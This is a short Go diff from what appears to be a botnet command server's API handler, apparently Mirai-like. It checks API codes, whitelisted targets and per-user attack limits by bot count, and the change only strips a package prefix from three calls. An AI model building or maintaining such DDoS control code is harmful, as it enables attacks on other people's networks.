@@ -28,7 +28,7 @@ func (this *Api) Handle() {
         return
     }
     passwordSplit := strings.SplitN(cmd, "|", 2)
-    if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
+    if apiKeyValid, userInfo = CheckApiCode(passwordSplit[0]); !apiKeyValid {
         this.conn.Write([]byte("ERR|API code invalid\r\n"))
         return
     }
@@ -59,11 +59,11 @@ func (this *Api) Handle() {
         this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
         return
     }
-    if database.ContainsWhitelistedTargets(atk) {
+    if ContainsWhitelistedTargets(atk) {
         this.conn.Write([]byte("ERR|Attack targetting whitelisted target\r\n"))
         return
     }
-    if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
+    if can, _ := CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
         this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
         return
     }
